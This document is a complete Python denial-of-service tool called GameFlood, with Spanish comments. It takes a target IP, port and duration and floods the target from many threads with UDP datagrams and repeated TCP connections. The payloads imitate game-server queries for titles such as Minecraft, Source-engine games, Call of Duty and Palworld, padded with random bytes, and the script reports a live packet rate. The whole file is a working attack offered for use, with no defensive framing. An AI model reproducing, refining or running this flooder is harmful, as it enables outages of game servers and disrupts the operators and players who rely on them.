#!/usr/bin/env python3
import socket
import random
import sys
import time
import threading
import os

class GameFlood:
    def __init__(self, ip, port, duration):
        self.ip = ip
        self.port = port
        self.duration = duration
        self.running = True
        self.total = 0
        self.lock = threading.Lock()
        
        # 100 game payloads mezclados UDP/TCP
        self.payloads = [
            # Minecraft (UDP)
            b'\xFE\xFD\x09' + os.urandom(100),
            b'\x01\x00\x00\x00\x00' + os.urandom(200),
            b'\x00' * 50 + os.urandom(300),
            
            # Source games (UDP)
            b'\xFF\xFF\xFF\xFFTSource Engine Query\x00' + os.urandom(200),
            b'\xFF\xFF\xFF\xFF\x55' + os.urandom(150),
            b'\xFF\xFF\xFF\xFF\x56' + os.urandom(150),
            
            # Steam (UDP)
            b'\x00\x00\x00\x00' + os.urandom(100),
            b'\x01\x00\x00\x00' + os.urandom(200),
            
            # Call of Duty (UDP)
            b'\xFF\xFF\xFF\xFFgetinfo\x00' + os.urandom(250),
            b'\xFF\xFF\xFF\xFFgetstatus\x00' + os.urandom(250),
            
            # Battlefield (UDP)
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(300),
            
            # Unreal/Quake (UDP)
            b'\xFF\xFF\xFF\xFFstatus\x00' + os.urandom(150),
            b'\xFF\xFF\xFF\xFFinfo\x00' + os.urandom(150),
            
            # Rust (UDP)
            b'\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(250),
            
            # ARK (UDP)
            b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' + os.urandom(300),
            
            # GTA Online (UDP)
            b'\x00' * 20 + os.urandom(400),
            
            # Valorant (UDP)
            b'\xFF\xFF\xFF\xFFinfo\x00' + os.urandom(200),
            
            # Apex (UDP)
            b'\xFF\xFF\xFF\xFFplayers\x00' + os.urandom(200),
            
            # Palworld (UDP)
            b'PAL' + os.urandom(300),
            
            # Payloads TCP (simulados en UDP)
            b'GET /server HTTP/1.1\r\nHost: ' + ip.encode() + b'\r\n\r\n' + os.urandom(200),
            b'POST /game HTTP/1.1\r\n' + os.urandom(300),
            b'STATUS\r\n' + os.urandom(150),
            b'QUERY\r\n' + os.urandom(150),
            b'PLAYERS\r\n' + os.urandom(150),
            
            # Datos aleatorios grandes
            os.urandom(1400),
            os.urandom(1300),
            os.urandom(1200),
            os.urandom(1100),
            os.urandom(1000),
            
            # Patrones repetidos
            b'\xAA' * 1400,
            b'\x55' * 1400,
            b'\x00' * 1400,
            b'\xFF' * 1400,
        ]
        
        # Asegurar 100 payloads
        while len(self.payloads) < 100:
            self.payloads.append(os.urandom(random.randint(500, 1400)))
    
    def udp_worker(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
        
        end = time.time() + self.duration
        count = 0
        
        while time.time() < end and self.running:
            for _ in range(100):
                p = random.choice(self.payloads)
                sock.sendto(p, (self.ip, self.port))
                count += 1
            
            if count >= 10000:
                with self.lock:
                    self.total += count
                count = 0
        
        sock.close()
        with self.lock:
            self.total += count
    
    def tcp_worker(self):
        end = time.time() + self.duration
        count = 0
        
        while time.time() < end and self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                
                sock.connect((self.ip, self.port))
                
                for _ in range(20):
                    p = random.choice(self.payloads)
                    sock.send(p)
                    count += 1
                
                sock.close()
                
            except:
                pass
            
            if count >= 5000:
                with self.lock:
                    self.total += count
                count = 0
        
        with self.lock:
            self.total += count
    
    def start(self):
        threads = []
        n = os.cpu_count() * 2
        
        print(f"GameFlood: {self.ip}:{self.port} | {self.duration}s | {n} threads")
        
        for i in range(n):
            if i % 3 == 0:
                t = threading.Thread(target=self.tcp_worker)
            else:
                t = threading.Thread(target=self.udp_worker)
            t.daemon = True
            t.start()
            threads.append(t)
        
        start = time.time()
        last = 0
        
        while time.time() - start < self.duration:
            time.sleep(1)
            with self.lock:
                current = self.total
                rate = current - last
                last = current
            print(f"\r[{int(time.time()-start)}s] Packets: {current:,} | {rate:,}/s", end="")
        
        self.running = False
        time.sleep(1)
        print(f"\nDone. Total: {self.total:,}")

if __name__ == "__main__":
    if len(sys.argv) != 4:
        sys.exit(1)
    g = GameFlood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
    g.start()
